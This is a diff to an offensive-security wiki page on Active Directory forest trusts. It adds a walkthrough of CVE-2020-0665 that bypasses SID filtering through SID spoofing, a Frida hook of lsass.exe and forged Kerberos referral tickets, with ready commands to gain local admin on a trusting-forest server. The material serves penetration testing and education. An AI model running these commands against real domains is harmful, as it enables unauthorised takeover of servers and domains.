@@ -102,10 +102,6 @@ make sure below
 If this flag is set, it means a inter-forest ticket spoofing an RID >= 1000 can be forged. This can usually lead to the trusting domain compromise. See [SID filtering](trusts.md#sid-filtering), and notes on [SID history](trusts.md#sid-history).
 {% endhint %}
 
-{% hint style="success" %}
-
-{% endhint %}
-
 {% hint style="info" %}
 SID filtering is not unique to trusts. It occurs "[whenever a service ticket is accepted](https://twitter.com/SteveSyfuhs/status/1329148611305693185)" either by the KDC or by a local service and behaves differently depending on the contect in which the ticket was produced.
 
@@ -360,13 +356,59 @@ raiseChild.py "child_domain"/"child_domain_admin":"$PASSWORD"
 
 _//_ [_https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research_](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research)__
 
+#### CVE-2020-0665
+
+The idea behind [CVE-2020-0665](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0665) is to bypass SID filtering to authenticate as a server in the trusting forest targeting the local admin on this server (RID = 500). To do so, the local domain SID of the server is spoofed to "fake" a child domain in the trusted forest, which will be added to the list of trusted SIDs in the trusting forest domain's TDO ([Trusted Domain Object](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt\_f2ceef4e-999b-4276-84cd-2e2829de5fc4)) after 24 hours (see [SID filtering](trusts.md#sid-filtering)). An inter-realm/referral ticket will then then forged using the spoofed SID as extended SID which will be used to request a service ticket to that server (see [Forging tickets](trusts.md#forging-tickets)).
+
+The attack is conducted as follows:
+
+1. **Get the local domain's SID of the target server**. This step requires Windows older than Windows 10 build 1607, or before Server 2016, as it uses MS-LSAT RPC to query the target server for the SID of its local domain, that is restricted on newer versions and requires administrative privileges on the target.
+2. **Spoof the local domain's SID of the target server**. This steps must be run as `SYSTEM` on the trusted forest's domain controller. The Frida script used for this step is made for Windows Server 2016 version 1607. If the target runs a different version, the address offset might be different and a some additional preparation must be done.
+3. **Forging tickets**. For this step, refer to [Kerberos authentication](trusts.md#kerberos-authentication) theory chapter for more details about the trust key being used, the ticket forgery is then highly similar to the [Forging ticket](trusts.md#forging-tickets) practice part.
+
+{% hint style="info" %}
+For more details about how this attack works under the hood, refer to the article on [dirkjanm.io](https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/) by [Dirk-jan Mollema](https://twitter.com/\_dirkjan).
+{% endhint %}
+
+{% hint style="warning" %}
+Some considerations to reproduce the attack:&#x20;
+
+* Full control over the trusted forest is assumed.&#x20;
+* Information that flows over to the trusting forest can be modified.&#x20;
+* There is at least one server joined to a domain in the trusting forest (referred to as the "target server" here).
+{% endhint %}
+
+The attack can be conducted with [Dirk-jan Mollema](https://twitter.com/\_dirkjan)'s [forest trust tools](https://github.com/dirkjanm/forest-trust-tools).
+
+<pre class="language-bash" data-title="1. Get Local Domain SID" data-overflow="wrap"><code class="lang-bash"><strong># Obtain the local domain's SID of the target server in the trusting forest
+</strong><strong># The hostname (Security Principal Name) of the target server is required
+</strong>getlocalsid.py "trusted_domain"/"someusername"@"&#x3C;target_server_FQDN or IP address>" "target_server_NETBIOS_name"
+</code></pre>
+
+<pre class="language-bash" data-title="2. Spoof the target SID" data-overflow="wrap"><code class="lang-bash"><strong># Become a "domain" in the trusted forest using the spoofed SID so that this one is added to the authorized SIDs in the trusting domain
+</strong><strong># Intercept the Netlogon request for an existing child domain in the trusted forset and modify the SID with the spoofed one by hooking lsass.exe when the NetrGetForestTrustInformation RPC call is made 
+</strong><strong># Notice that the SID of the child domain to look for and the local domain's SID of the  target server should be modified with the right values
+</strong><strong># This is to be run as SYSTEM on the trusted DC
+</strong>python3 .\frida_intercept.py lsass.exe
+</code></pre>
+
+<pre class="language-bash" data-title="3. Get local admin on the target" data-overflow="wrap"><code class="lang-bash"><strong># 1. Forge an inter-realm/referral ticket with the spoofed SID put as extended SID with RID 500 using the AES key of the incoming trustticketer.py -aesKey "AES_key_of_incoming_trust" -domain "trusted_root_domain_FQDN" -domain-sid "trusted_root_domain_SID" -user-id 1000 -groups 513 -extra-sid "&#x3C;spoofed_SID>"-500 -spn "krbtgt/trusting_root_domain_FQDN" "someusername"
+</strong><strong>
+</strong><strong># 2. Request a service ticket using the forged referral ticket
+</strong><strong># Notice that keys has to be manually modified in the getftST.py script before
+</strong>KRB5CCNAME="someusername.ccache" getftST.py -spn "CIFS/target_server_FQDN" -target-domain "trusting_root_domain_FQDN" -via-domain "trusted_root_domain_FQDN" "domain/username" -dc-ip "target_DC_IP"
+<strong>
+</strong><strong># 3. Use the obtained ST to access the target server as local admin
+</strong>KRB5CCNAME=username.ccache smbclient.py -k "trusted_domain"/"someusername"@"target_server_FQDN" -no-pass
+</code></pre>
+
 #### Keys container trust
 
 // [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research)
 
 // Enterprise Domain Controllers have `GenericAll` on `Keys` container (`CN=keys,DN=domain,DN=local`), "Default container for key credential objects", used for gMSA ?
 
-// Container should be empty, but if it's not, ploitable seulement s'il y a déjà des objets dans le conteneur ce qui n'est pas censé être le cas par défaut.
+// Container should be empty, but if it's not, exploitable seulement s'il y a déjà des objets dans le conteneur ce qui n'est pas censé être le cas par défaut.
 
 #### DNS trust
 
